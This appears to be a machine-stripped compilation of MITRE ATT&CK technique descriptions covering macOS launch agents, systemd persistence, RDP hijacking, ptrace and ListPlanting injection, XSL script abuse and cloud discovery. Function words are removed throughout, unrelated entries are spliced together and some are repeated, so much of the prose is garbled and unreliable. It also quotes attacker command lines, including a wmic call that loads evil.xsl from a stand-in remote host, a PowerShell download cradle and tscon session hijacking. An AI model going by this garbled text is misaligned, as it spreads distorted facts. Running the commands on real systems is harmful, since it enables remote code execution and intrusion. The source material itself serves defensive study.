Adversaries employ keylogger target hardware tokens, RSA SecurID. Capturing token input (including user's personal identification code) provide temporary access replay one-time passcode rollover) enabling adversaries reliably predict future authentication values (given access algorithm seed values generate appended temporary codes). (Citation: GCN RSA June 2011)

Other methods MFA intercepted adversary authenticate. common one-time codes out-of-band communications (email, SMS). device service secured, vulnerable interception. focused cyber criminals, authentication mechanisms targeted advanced actors. (Citation: Operation Emmental) Apple’s developer documentation, user logs in, per-user launchd process started loads parameters launch-on-demand user agent property list (plist) files <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, <code>$HOME/Library/LaunchAgents</code> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). launch agents property list files executables launched (Citation: OSX.Dok Malware).
 
Adversaries install launch agent configured execute login launchd launchctl load plist directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods Mac Malware Persistence). agent disguised operating benign software. Launch Agents created user level privileges executed privileges user log (Citation: OSX Malware Detection) (Citation: OceanLotus OS X). set execute specific user logs (in specific user’s directory structure) user logs (which requires administrator privileges). Adversaries perform software packing virtual machine software protection conceal code. Software packing method compressing encrypting executable. Packing executable file signature attempt avoid signature-based detection. decompression techniques decompress executable code memory. Virtual machine software protection translates executable's original code special format special virtual machine run. virtual machine called code.(Citation: ESET FinFisher Jan 2018) 

Utilities perform software packing called packers. packers MPRESS UPX. comprehensive list packers available, adversaries create packing techniques leave artifacts well-known packers evade defenses.(Citation: Awesome Executable Packing)   Adversaries compromise serverless cloud infrastructure, Cloudflare Workers AWS Lambda functions, targeting. utilizing serverless infrastructure, adversaries difficult attribute infrastructure operations them. 

Once compromised, serverless runtime environment leveraged respond infected machines [Proxy](https://attack.mitre.org/techniques/T1090) traffic adversary-owned command control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) traffic generated functions subdomains common cloud providers, difficult distinguish ordinary traffic providers.(Citation: Detecting Command & Control Cloud)(Citation: BlackWater Malware Cloudflare Workers) Adversaries communicate application layer protocols traffic avoid detection/network filtering blending existing traffic. Commands remote system, commands, embedded protocol traffic client server. 

Protocols HTTPS carry traffic common environments. HTTP/S packets fields headers data concealed. adversary abuse protocols communicate systems control victim network mimicking normal, expected traffic.  Adversaries abuse Visual Basic (VB) execution. VB programming language created interoperability Windows technologies [Component Object Model](https://attack.mitre.org/techniques/T1559/001) [Native API](https://attack.mitre.org/techniques/T1106) Windows API. tagged legacy planned future evolutions, VB integrated supported .NET Framework cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)

Derivative languages based VB created, Visual Basic Applications (VBA) VBScript. VBA event-driven programming language built Office, third-party applications.(Citation: VBA)(Citation: Wikipedia VBA) VBA enables documents macros automate execution tasks functionality host. VBScript default scripting language Windows hosts [JavaScript](https://attack.mitre.org/techniques/T1059/007) Application (HTA) webpages served Internet Explorer (though modern browsers VBScript support).(Citation: VBScript)

Adversaries VB payloads execute malicious commands. Common malicious usage includes automating execution behaviors VBScript embedding VBA content [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) enable execution).(Citation: Default VBS macros Blocking ) Adversaries hidden file conceal malicious activity users security tools. File systems provide structure store access data physical storage. Typically, user engages file applications access files directories, abstraction physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, APFS. File systems structures, Volume Boot Record (VBR) Master File Table (MFT) NTFS.(Citation: MalwareTech VFS Nov 2014)

Adversaries abstracted file system, separate standard file infected system. so, adversaries hide presence malicious components file input/output security tools. Hidden file systems, referred virtual file systems, implemented numerous ways. implementation store file disk space unused disk structures standard file partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) implementation adversary drop portable partition image file standard file system.(Citation: ESET ComRAT 2020) Adversaries fragment files existing file structure non-standard ways.(Citation: Kaspersky Equation QA) Adversaries create modify systemd services repeatedly execute malicious payloads persistence. systemd service manager commonly managing background daemon processes (also services) resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd default initialization (init) Linux distributions starting Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, replaces legacy init systems including SysVinit Upstart remaining compatible aforementioned init systems.

Systemd utilizes configuration files service units control services boot conditions. default, unit files stored <code>/etc/systemd/system</code> <code>/usr/lib/systemd/system</code> directories file extension <code>.service</code>. service unit file numerous directives execute commands:

* ExecStart, ExecStartPre, ExecStartPost directives cover execution commands services started manually 'systemctl' start service set automatically start. 
* ExecReload directive covers service restarts. 
* ExecStop ExecStopPost directives cover service stopped manually 'systemctl'.

Adversaries systemd functionality establish persistent access victim systems creating modifying service unit files systemd execute malicious commands boot.(Citation: Anomali Rocke March 2019)

While adversaries typically require root privileges create/modify service unit files <code>/etc/systemd/system</code> <code>/usr/lib/systemd/system</code> directories, privilege users create/modify service unit files directories <code>~/.config/systemd/user/</code> achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016) Adversaries hijack legitimate user’s remote desktop session laterally environment. Remote desktop common feature operating systems. user log interactive session desktop graphical user interface remote system. refers implementation Remote Desktop Protocol (RDP) Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

Adversaries perform RDP session hijacking involves stealing legitimate user's remote session. Typically, user notified steal session. permissions Terminal Services Console, `c:\windows\system32\tscon.exe [session stolen]`, adversary hijack session credentials prompts user.(Citation: RDP Hijacking Korznikov) remotely locally active disconnected sessions.(Citation: RDP Hijacking Medium) lead [Remote Discovery](https://attack.mitre.org/techniques/T1018) Privilege Escalation stealing Domain Admin privileged account session. native Windows commands, feature red teaming tools.(Citation: Kali Redsnarf) Adversaries create account maintain access victim systems. sufficient level access, creating accounts establish secondary credentialed access require persistent remote access tools deployed system.

Accounts created local domain cloud tenant. cloud environments, adversaries create accounts access specific services, reduce chance detection. Adversaries modify XDG autostart entries execute programs commands boot. Linux desktop environments XDG compliant implement functionality XDG autostart entries. entries application automatically start startup desktop environment user logon. default, XDG autostart entries stored <code>/etc/xdg/autostart</code> <code>~/.config/autostart</code> directories .desktop file extension.(Citation: Desktop Application Autostart Feb 2006)

Within XDG autostart entry file, <code>Type</code> key specifies entry application (type 1), link (type 2) directory (type 3). <code>Name</code> key arbitrary assigned creator <code>Exec</code> key application command arguments execute.(Citation: Desktop Entry Keys)

Adversaries XDG autostart entries maintain persistence executing malicious commands payloads, remote access tools, startup desktop environment. Commands included XDG autostart entries execute user logon context logged user. Adversaries [Masquerading](https://attack.mitre.org/techniques/T1036) XDG autostart entries legitimate programs. Adversaries compromise third-party servers targeting. servers adversary stage, launch, execute operation. post-compromise activity, adversaries utilize servers tasks, including Command Control. purchasing [Server](https://attack.mitre.org/techniques/T1583/004) [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries compromise third-party servers support operations.

Adversaries compromise servers support watering hole operations, [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). adversary attempt enumerate cloud services running gaining access. methods platform-as-a-service (PaaS), infrastructure-as-a-service (IaaS), software-as-a-service (SaaS). services exist cloud providers include Continuous Integration Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. 

Adversaries attempt discover services enabled environment. Azure tools APIs, Azure Graph API Azure Resource Manager API, enumerate resources services, including applications, management groups, resources policy definitions, relationships accessible identity.(Citation: Azure - Resource Manager API)(Citation: Azure Graph API)

Stormspotter source tool enumerating constructing graph Azure resources services, Pacu source AWS exploitation framework supports methods discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu) Adversaries hide program's true filetype changing extension file. file types (specifically .app extensions), appending space filename change file processed operating system. example, Mach-O executable file called evil.bin, double clicked user, launch Terminal.app execute. file renamed evil.txt, double clicked user, launch default editing application (not executing binary). However, file renamed "evil.txt " (note space end), double clicked user, true file type determined OS handled appropriately binary executed (Citation: Mac Backdoors back). 

Adversaries feature trick users double clicking benign-looking files format ultimately executing malicious. Adversaries attempt listing systems IP address, hostname, logical identifier network Lateral Movement current system. Functionality exist remote access tools enable this, utilities operating  [Ping](https://attack.mitre.org/software/S0097) <code>net view</code> [Net](https://attack.mitre.org/software/S0039).

Adversaries analyze data local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> <code>/etc/hosts</code>) passive (such local [Arp](https://attack.mitre.org/software/S0099) cache entries) discover presence remote systems environment.

Adversaries target discovery network infrastructure leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands network devices gather detailed systems network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS 2021)  
 Adversaries attempt listing services running remote hosts local network infrastructure devices, including vulnerable remote software exploitation. Common methods acquire include port vulnerability scans tools brought system.(Citation: CISA AR21-126A FIVEHANDS 2021)   

Within cloud environments, adversaries attempt discover services running cloud hosts. Additionally, cloud environment connected on-premises environment, adversaries identify services running non-cloud systems well.

Within macOS environments, adversaries native Bonjour application discover services running macOS hosts network. Bonjour mDNSResponder daemon automatically registers advertises host’s registered services network. example, adversaries mDNS query (such <code>dns-sd -B _ssh._tcp .</code>) systems broadcasting ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley) Adversaries gather victim's network domain(s) targeting. domains properties include variety details, including domain(s) victim owns administrative data (ex: name, registrar, etc.) actionable contacts (email addresses phone numbers), business addresses, servers.

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598). victim domains properties exposed adversaries online accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) third-party cloud providers use, exposed publicly API endpoints, GetUserRealm autodiscover Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering reveal opportunities forms reconnaissance (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Websites/Domains](https://attack.mitre.org/techniques/T1593), [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)). Adversaries attempt listing software software versions installed cloud environment. Adversaries [Software Discovery](https://attack.mitre.org/techniques/T1518) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.

Adversaries attempt enumerate software variety reasons, figuring security measures compromised version software vulnerable [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068). adversary cloud service dashboard GUI stolen credentials gain operational cloud environment, specific services, resources, features. example, GCP Command Center view assets, findings potential security risks, additional queries, finding public IP addresses ports.(Citation: Google Command Center Dashboard)

Depending configuration environment, adversary enumerate graphical dashboard API. adversary gain API requests. Adversaries inject malicious code processes thread local storage (TLS) callbacks evade process-based defenses elevate privileges. TLS callback injection method executing arbitrary code address space separate live process. 

TLS callback injection involves manipulating pointers portable executable (PE) redirect process malicious code reaching code's legitimate entry point. TLS callbacks OS setup cleanup data threads. Manipulating TLS callbacks performed allocating writing specific offsets process’ memory space [Process Injection](https://attack.mitre.org/techniques/T1055) techniques [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)

Running code context process access process's memory, system/network resources, elevated privileges. Execution TLS callback injection evade detection security products execution masked legitimate process.  Adversaries employ detect avoid debuggers. Debuggers typically defenders trace analyze execution potential malware payloads.(Citation: ProcessHacker Github)

Debugger evasion include changing behaviors based checks presence artifacts indicative debugged environment. [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), adversary detects debugger, alter malware disengage victim conceal core functions implant. search debugger artifacts dropping secondary additional payloads.

Specific checks vary based target adversary, involve [Native API](https://attack.mitre.org/techniques/T1106) function calls <code>IsDebuggerPresent()</code> <code> NtQueryInformationProcess()</code>, manually checking <code>BeingDebugged</code> flag Process Environment Block (PEB). checks debugging artifacts seek enumerate hardware breakpoints, interrupt assembly opcodes, time checks, measurements exceptions raised current process (assuming debugger “swallow” handle potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)

Adversaries learned debugger checks automated discovery shape follow-on behaviors. Debuggers evaded detaching process flooding debug logs meaningless data messages produced looping [Native API](https://attack.mitre.org/techniques/T1106) function calls <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021) Adversaries hide program's true filetype changing extension file. file types (specifically .app extensions), appending space filename change file processed operating system.

For example, Mach-O executable file called <code>evil.bin</code>, double clicked user, launch Terminal.app execute. file renamed <code>evil.txt</code>, double clicked user, launch default editing application (not executing binary). However, file renamed <code>evil.txt </code> (note space end), double clicked user, true file type determined OS handled appropriately binary executed (Citation: Mac Backdoors back).

Adversaries feature trick users double clicking benign-looking files format ultimately executing malicious. Adversaries modify plist files automatically application user logs in. user logs restarts macOS Graphical User Interface (GUI), prompt user checkbox "Reopen windows logging in".(Citation: Re-Open windows Mac) selected, applications property list file named <code>com.apple.loginwindow.[UUID].plist</code> <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed file automatically reopened user’s logon.

Adversaries establish [Persistence](https://attack.mitre.org/tactics/TA0003) adding malicious application path <code>com.apple.loginwindow.[UUID].plist</code> file execute payloads user logs in. Adversaries poison mechanisms influence search engine optimization (SEO) lure staged capabilities potential victims. Search engines typically display users based purchased ads site’s ranking/score/reputation calculated crawlers algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)

To facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries stage content explicitly manipulates SEO rankings promote sites hosting malicious payloads (such [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) search engines. Poisoning SEO rankings involve tricks, stuffing keywords (including form hidden text) compromised sites. keywords interests/browsing habits intended victim(s) broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)

Adversaries purchase plant incoming links staged capabilities boost site’s calculated relevance reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)

SEO poisoning combined evasive redirects cloaking mechanisms (such measuring mouse movements serving content based browser user agents, user language/localization settings, headers) feed SEO inputs avoiding scrutiny defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader) Adversaries “pass hash” stolen password hashes laterally environment, bypassing normal access controls. Pass hash (PtH) method authenticating user access user's cleartext password. method bypasses standard authentication steps require cleartext password, moving portion authentication password hash.

When performing PtH, valid password hashes account captured [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes PtH authenticate user. authenticated, PtH perform actions local remote systems.

Adversaries stolen password hashes "overpass hash." PtH, involves password hash authenticate user password hash create valid Kerberos ticket. ticket perform [Pass Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash) Adversaries attempt exfiltrate data physical medium, removable drive. circumstances, air-gapped network compromise, exfiltration occur physical medium device introduced user. media external hard drive, USB drive, cellular phone, MP3 player, removable storage processing device. physical medium device final exfiltration hop disconnected systems. Adversaries execute malicious payloads side-loading DLLs. [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking DLL program loads. planting DLL search program waiting victim application invoked, adversaries side-load payloads planting invoking legitimate application executes payload(s).

Side-loading takes advantage DLL search loader positioning victim application malicious payload(s) other. Adversaries side-loading masking actions perform legitimate, trusted, elevated software process. Benign executables side-load payloads flagged delivery execution. Adversary payloads encrypted/packed obfuscated loaded memory trusted process.(Citation: FireEye DLL Side-Loading) Adversaries transfer tools files external compromised environment. Tools files copied external adversary-controlled victim network command control channel alternate protocols [ftp](https://attack.mitre.org/software/S0095). present, adversaries transfer/spread tools victim devices compromised environment [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

Files transferred [Web Service](https://attack.mitre.org/techniques/T1102)s native tools victim system.(Citation: PTSecurity Cobalt Dec 2016)

On Windows, adversaries utilities download tools, `copy`, `finger`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands <code>IEX(New-Object Net.WebClient).downloadString()</code> <code>Invoke-WebRequest</code>. Linux macOS systems, variety utilities exist, `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, `wget`.(Citation: t1105_lolbas) Adversaries grant additional permission levels maintain persistent access adversary-controlled email account. 

For example, <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, on-premises Exchange cloud-based service Office 365, adds permissions mailbox.(Citation: - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding Plain Sight 2018) Google Workspace, delegation enabled Google Admin console users delegate accounts Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Safe) 

Adversaries assign mailbox folder permissions individual folder permissions roles. Office 365 environments, adversaries assign Default Anonymous user permissions roles Store (root), Inbox, mailbox folders. assigning user permissions folder, adversary utilize account tenant maintain persistence target user’s mail folders.(Citation: Remediation Hardening Strategies 365 Defend UNC2452)

This persistent threat incidents BEC (Business Email Compromise) incidents adversary add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) accounts compromise. enable additional techniques gaining access systems. example, compromised business accounts send messages accounts network target business creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019) Adversaries steal code signing certificates targeting. Code signing process digitally signing executables scripts confirm software author guarantee code altered corrupted. Code signing level authenticity program developer guarantee program tampered with.(Citation: Wikipedia Code Signing) Users security tools trust signed piece code unsigned piece code issued certificate author is.

Prior [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries purchase steal code signing certificates operations. purchase code signing certificates organization stolen compromised entity adversary validate certificate provider entity. Adversaries steal code signing materials compromised third-party. Adversaries remove share connections clean traces operation. Windows shared drive [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections removed needed. [Net](https://attack.mitre.org/software/S0039) utility remove network share connections <code>net \\system\share /delete</code> command. (Citation: Technet Use)

 Adversaries abuse serverless computing, integration, automation services execute arbitrary code cloud environments. cloud providers offer variety serverless resources, including compute engines, application integration services, servers. 

Adversaries abuse resources executing arbitrary commands. example, adversaries serverless functions execute malicious code, crypto-mining malware [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries create functions enable compromise cloud environment. example, adversary `IAM:PassRole` permission AWS `iam.serviceAccounts.actAs` permission Google Cloud add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) serverless cloud function, perform actions original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)

Serverless functions invoked response cloud events [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), enabling persistent execution time. example, AWS environments, adversary create Lambda function automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) user CloudWatch events rule invokes function user created.(Citation: Backdooring AWS account) Similarly, adversary create Power Automate workflow Office 365 environments forwards emails user receives creates anonymous sharing links user granted access document SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: DART Report 001) Windows Management Instrumentation (WMI) install event filters, providers, consumers, bindings execute code defined event occurs. Adversaries capabilities WMI subscribe event execute arbitrary code event occurs, providing persistence system. Adversaries attempt evade detection technique compiling WMI scripts Windows Management Object (MOF) files (.mof extension). (Citation: Dell WMI Persistence) Examples events subscribed wall clock time computer's uptime. (Citation: Kazanciyan 2014) threat reportedly technique maintain persistence. (Citation: Mandiant M-Trends 2015) Apple’s developer documentation, macOS OS boot up, launchd finish initialization. process loads parameters launch-on-demand system-level daemon property list (plist) files <code>/System/Library/LaunchDaemons</code> <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). LaunchDaemons property list files executables launched (Citation: Methods Mac Malware Persistence).
 
Adversaries install launch daemon configured execute startup launchd launchctl load plist directories (Citation: OSX Malware Detection). daemon disguised operating benign software  (Citation: WireLurker). Launch Daemons created administrator privileges, executed root privileges, adversary service escalate privileges administrator root.
 
The plist file permissions root:wheel, script program requirement. So, poor configurations adversary modify current Launch Daemon’s executable gain persistence Privilege Escalation. Adversaries inject malicious code processes ptrace (process trace) calls evade process-based defenses elevate privileges. Ptrace injection method executing arbitrary code address space separate live process. 

Ptrace injection involves attaching modifying running process. ptrace enables debugging process observe control process (and individual thread), including changing memory register values.(Citation: PTRACE man) Ptrace injection commonly performed writing arbitrary code running process (ex: <code>malloc</code>) invoking memory <code>PTRACE_SETREGS</code> set register instruction execute. Ptrace injection <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, data specific address target processes’ memory (ex: current address instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) 

Ptrace injection targeting processes non-child processes higher-privileges.(Citation: Linux Inject) 

Running code context process access process's memory, system/network resources, elevated privileges. Execution ptrace injection evade detection security products execution masked legitimate process.  Adversaries obfuscate dynamically resolve API functions called malware conceal malicious functionalities impair defensive analysis. Malware commonly [Native API](https://attack.mitre.org/techniques/T1106) functions OS perform tasks involving processes, files, artifacts.

API functions called malware leave static artifacts strings payload files. Defensive analysts uncover functions binary file execute import address table (IAT) structures dynamically link calling code shared modules provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)

To avoid static defensive analysis, adversaries dynamic API resolution conceal malware characteristics functionalities. [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution change file signatures obfuscate malicious API function calls resolved invoked runtime.

Various methods obfuscate malware calls API functions. example, hashes function names commonly stored malware lieu literal strings. Malware hashes (or identifiers) manually reproduce linking loading process functions `GetProcAddress()` `LoadLibrary()`. hashes/identifiers obfuscated encryption string manipulation tricks (requiring forms [Deobfuscate/Decode Files Information](https://attack.mitre.org/techniques/T1140) execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash) Adversaries [Valid Accounts](https://attack.mitre.org/techniques/T1078) log Remote Desktop Protocol (RDP). adversary perform actions logged-on user.

Remote desktop common feature operating systems. user log interactive session desktop graphical user interface remote system. refers implementation Remote Desktop Protocol (RDP) Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) 

Adversaries connect remote RDP/RDS expand access service enabled access accounts credentials. Adversaries Credential Access techniques acquire credentials RDP. Adversaries RDP conjunction [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) Persistence.(Citation: Alperovitch Malware) Adversaries Windows logon scripts automatically executed logon initialization establish persistence. Windows logon scripts specific user users log system.(Citation: TechNet Logon Scripts) adding path script <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)

Adversaries scripts maintain persistence single system. Depending access configuration logon scripts, local credentials administrator account necessary.  Adversaries abuse list-view controls inject malicious code hijacked processes evade process-based defenses elevate privileges. ListPlanting method executing arbitrary code address space separate live process. Code executed ListPlanting evade detection security products execution masked legitimate process.

List-view controls user interface windows display collections items.(Citation: List View Controls) application's list-view settings stored process' memory <code>SysListView32</code> control.

ListPlanting (a form message-passing "shatter attack") performed copying code virtual address space process list-view control code custom callback sorting listed items.(Citation: Modexp Windows Process Injection) Adversaries code target process’ memory space, performed including obtaining handle <code>SysListView32</code> child victim process window (via Windows API calls <code>FindWindow</code> <code>EnumWindows</code>) [Process Injection](https://attack.mitre.org/techniques/T1055) methods.

Some variations ListPlanting allocate memory target process window messages payload, avoid highly monitored <code>WriteProcessMemory</code> function. example, adversary <code>PostMessage</code> <code>SendMessage</code> API functions send <code>LVM_SETITEMPOSITION</code> <code>LVM_GETITEMPOSITION</code> messages, effectively copying payload 2 bytes time allocated memory.(Citation: ESET InvisiMole June 2020) 

Finally, payload triggered sending <code>LVM_SORTITEMS</code> message <code>SysListView32</code> child process window, payload newly allocated buffer passed executed <code>ListView_SortItems</code> callback. Adversaries modify configuration settings domain evade defenses escalate privileges domain environments. Domains provide centralized managing resources (ex: computers, user accounts) act, interact other, network. policy domain includes configuration settings apply domains multi-domain/forest environment. Modifications domain settings include altering domain Policy Objects (GPOs) changing trust settings domains, including federation trusts.

With sufficient permissions, adversaries modify domain policy settings. domain configuration settings control interactions Active Directory (AD) environment, potential attacks stem abuse. Examples abuse include modifying GPOs push malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) computers domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide GPOs)(Citation: Harmj0y Abusing GPO Permissions) modifying domain trusts include adversary controlled domain control access tokens subsequently accepted victim domain resources.(Citation: - Customer Guidance Nation-State Cyber Attacks) Adversaries change configuration settings environment implement [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).

Adversaries temporarily modify domain policy, carry malicious action(s), revert change remove suspicious indicators. Adversaries bypass application control obscure execution code embedding scripts XSL files. Extensible Stylesheet Language (XSL) files commonly processing rendering data XML files. support complex operations, XSL standard includes support embedded scripting languages. (Citation: XSLT Script Mar 2017)

Adversaries abuse functionality execute arbitrary files bypassing application control. [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), common transformation utility binary (msxsl.exe) (Citation: msxsl.exe) installed execute malicious JavaScript embedded local remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) msxsl.exe installed default, adversary package dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes main arguments, XML source file XSL stylesheet. XSL file valid XML, adversary XSL file twice. msxsl.exe adversaries XML/XSL files arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation technique, dubbed “Squiblytwo”, involves [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) invoke JScript VBScript XSL file.(Citation: LOLBAS Wmic) technique execute local/remote scripts and, [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ "Squiblydoo" counterpart, leverages trusted, built-in Windows tool. Adversaries abuse alias [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) utilize /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code> Adversaries search public scan databases victims targeting. online services continuously publish Internet scans/surveys, harvesting active IP addresses, hostnames, ports, certificates, server banners.(Citation: Shodan)

Adversaries search scan databases gather actionable information. Threat actors online resources lookup tools harvest services. Adversaries seek identified targets, datasets discover opportunities successful breaches. sources reveal opportunities forms reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)). Adversaries set files directories hidden evade detection mechanisms. prevent normal users accidentally changing special files system, operating systems concept ‘hidden’ file. files don’t user browses file GUI normal commands command line. Users explicitly hidden files series Graphical User Interface (GUI) prompts command switches (<code>dir /a</code> Windows <code>ls –a</code> Linux macOS).

On Linux Mac, users mark specific files hidden simply putting “.” character file folder  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files folders start period, ‘.’, default hidden viewed Finder application standard command-line utilities “ls”. Users change settings files viewable.

Files macOS marked UF_HIDDEN flag prevents Finder.app, Terminal.app (Citation: WireLurker). Windows, users mark specific files hidden attrib.exe binary. applications create hidden files folders store doesn’t clutter user’s workspace. example, SSH utilities create .ssh folder that’s hidden user’s hosts keys.

Adversaries advantage hide files folders evading typical user analysis incorporate investigation hidden files. adversary create snapshot data backup cloud account evade defenses. snapshot point-in-time existing cloud compute component virtual machine (VM), virtual hard drive, volume. adversary leverage permissions create snapshot bypass restrictions prevent access existing compute service infrastructure, [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) adversary revert snapshot evade detection remove evidence presence.

An adversary [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount created snapshots instance, apply policy adversary access created instance, firewall policy inbound outbound SSH access.(Citation: Mandiant M-Trends 2020) Adversaries gather victim's physical location(s) targeting. physical locations target organization include variety details, including key resources infrastructure housed. Physical locations legal jurisdiction authorities victim operates within.

